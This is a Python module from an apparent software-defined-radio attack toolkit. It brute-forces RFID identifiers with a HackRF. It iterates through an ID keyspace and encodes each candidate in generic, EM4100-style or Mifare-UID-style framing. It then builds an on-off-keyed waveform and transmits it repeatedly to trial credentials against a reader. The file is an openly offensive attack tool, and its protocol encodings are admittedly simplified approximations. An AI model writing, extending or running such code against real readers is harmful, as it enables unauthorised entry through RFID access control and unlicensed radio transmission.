"""
RFID Brute-Force Attack (HackRF)
================================

Actively iterates through an ID / keyspace and transmits RFID frames
using the HackRF. Designed for simple LF/HF RFID systems that accept
unencrypted identifiers or short keys.

This module focuses on the TX/brute-force orchestration; protocol‑
specific bit layouts can be expanded later.
"""

import os
import time
import logging
import tempfile
from dataclasses import dataclass
from typing import Optional, Tuple

import numpy as np

from modules.sdr_controller import SDRController, SDRState

logger = logging.getLogger("RFIDBruteForce")


@dataclass
class RFIDBruteForceConfig:
    """Configuration for RFID brute-force attack."""
    start_id: int = 0
    end_id: int = 1023              # Default: 10‑bit space
    carrier_hz: float = 13.56e6     # HF RFID default (e.g., Mifare)
    sample_rate: float = 2e6
    repeat_per_id: int = 3          # How many frames per candidate
    frame_duration_s: float = 5e-3  # 5 ms per frame (approx.)
    guard_time_s: float = 3e-3      # Silence between frames
    protocol: str = "generic"       # 'generic', 'em4100', 'mifare_uid4'


class RFIDBruteForceAttack:
    """
    Brute‑force simple RFID identifiers using the HackRF.

    Generates a basic ASK/OOK carrier keyed by the candidate ID; this
    is intentionally generic and can be customized for a specific RFID
    protocol (e.g., EM4100, Mifare UID preambles) by changing
    `_encode_id_to_bits` and `_bits_to_baseband`.
    """

    def __init__(self, sdr: SDRController, config: Optional[RFIDBruteForceConfig] = None):
        self.sdr = sdr
        self.config = config or RFIDBruteForceConfig()
        self._stop_requested = False
        self._running = False
        self.current_id: Optional[int] = None

    @property
    def is_running(self) -> bool:
        return self._running

    def stop(self):
        """Request graceful stop."""
        logger.info("[RFID] Stop requested.")
        self._stop_requested = True

    # ------------------------------------------------------------------
    # Core brute‑force loop
    # ------------------------------------------------------------------
    def run(self) -> None:
        """
        Execute brute‑force from start_id to end_id (inclusive).
        """
        if self._running:
            logger.warning("[RFID] Brute‑force already running.")
            return

        self._running = True
        self._stop_requested = False

        cfg = self.config
        logger.info(
            f"[RFID] Starting brute‑force from {cfg.start_id} to {cfg.end_id} "
            f"on {cfg.carrier_hz/1e6:.3f} MHz"
        )

        # Ensure SDR is ready
        if not self.sdr.is_open:
            if not self.sdr.open():
                logger.error("[RFID] Failed to open SDR for brute‑force.")
                self._running = False
                return

        # Make sure we are not in RX/jam state
        if self.sdr.device.state == SDRState.RX_RUNNING:
            self.sdr.stop(requester="rfid_bruteforce")
            time.sleep(0.1)
        self.sdr.stop_jamming(requester="rfid_bruteforce")

        try:
            for candidate in range(cfg.start_id, cfg.end_id + 1):
                if self._stop_requested:
                    break

                self.current_id = candidate
                bits = self._encode_id_to_bits(candidate)
                iq = self._bits_to_baseband(bits, cfg)

                # Save to temporary CS16 file
                with tempfile.NamedTemporaryFile(suffix=".cs16", delete=False) as tmp:
                    tmp_path = tmp.name

                self._save_cs16(iq, tmp_path)

                logger.info(f"[RFID] Transmitting ID {candidate} (bits={bits})")

                success = self.sdr.transmit_file(
                    filepath=tmp_path,
                    freq=cfg.carrier_hz,
                    sample_rate=cfg.sample_rate,
                    requester="rfid_bruteforce"
                )

                if os.path.exists(tmp_path):
                    os.remove(tmp_path)

                if not success:
                    logger.error("[RFID] TX failed, stopping brute‑force.")
                    break

                # Guard time between candidates
                time.sleep(cfg.guard_time_s)

        except Exception as e:
            logger.error(f"[RFID] Brute‑force error: {e}")
        finally:
            self.current_id = None
            self._running = False
            logger.info("[RFID] Brute‑force finished.")

    # ------------------------------------------------------------------
    # Waveform construction helpers
    # ------------------------------------------------------------------
    def _encode_id_to_bits(self, candidate_id: int) -> str:
        """
        Encode numeric ID to a bitstring for the selected protocol.

        Supported protocols (simplified, not full spec fidelity):
        - generic:  8‑bit preamble (0xAA) + 16‑bit ID
        - em4100:   9 '1' header bits + 40‑bit ID (truncated/zero‑padded)
        - mifare_uid4: simple 8‑bit preamble + 32‑bit UID
        """
        proto = (self.config.protocol or "generic").lower()

        if proto == "em4100":
            # EM4100: 64‑bit frame; we approximate as:
            # 9 header '1' bits + 40 ID bits + remaining padding.
            header = "1" * 9
            id_bits = format(candidate_id & ((1 << 40) - 1), "040b")
            # Pad to 64 bits total
            bits = header + id_bits
            return bits.ljust(64, "0")

        if proto in ("mifare", "mifare_uid4"):
            # 4‑byte UID (32 bits), simple preamble
            preamble = "11010010"
            uid_bits = format(candidate_id & 0xFFFFFFFF, "032b")
            return preamble + uid_bits

        # Default generic framing: 8‑bit preamble (e.g., 0xAA) + 16‑bit ID
        preamble = "10101010"
        id_bits = format(candidate_id & 0xFFFF, "016b")
        return preamble + id_bits

    def _bits_to_baseband(self, bits: str, cfg: RFIDBruteForceConfig) -> np.ndarray:
        """
        Generate a simple ASK/OOK baseband waveform for the bitstring.

        1 = carrier on, 0 = carrier off, fixed bit period derived from
        frame_duration and bit length.
        """
        total_bits = len(bits)
        if total_bits == 0:
            return np.zeros(0, dtype=np.int16)

        bit_period = cfg.frame_duration_s / total_bits
        samples_per_bit = int(cfg.sample_rate * bit_period)
        samples_per_bit = max(samples_per_bit, 8)  # Ensure minimum resolution

        # Preallocate complex baseband
        total_samples = samples_per_bit * total_bits
        carrier = np.zeros(total_samples, dtype=np.complex64)

        # Simple rectangular ASK envelope
        amp = 0.8
        for i, b in enumerate(bits):
            start = i * samples_per_bit
            end = start + samples_per_bit
            if b == "1":
                carrier[start:end] = amp + 0j

        # Convert to interleaved CS16 (int16 I/Q, Q=0)
        i_samples = (np.real(carrier) * 32767).astype(np.int16)
        q_samples = np.zeros_like(i_samples, dtype=np.int16)
        iq = np.empty(total_samples * 2, dtype=np.int16)
        iq[0::2] = i_samples
        iq[1::2] = q_samples
        return iq

    def _save_cs16(self, samples: np.ndarray, path: str) -> None:
        """Save interleaved int16 IQ samples to .cs16 file."""
        with open(path, "wb") as f:
            f.write(samples.tobytes())

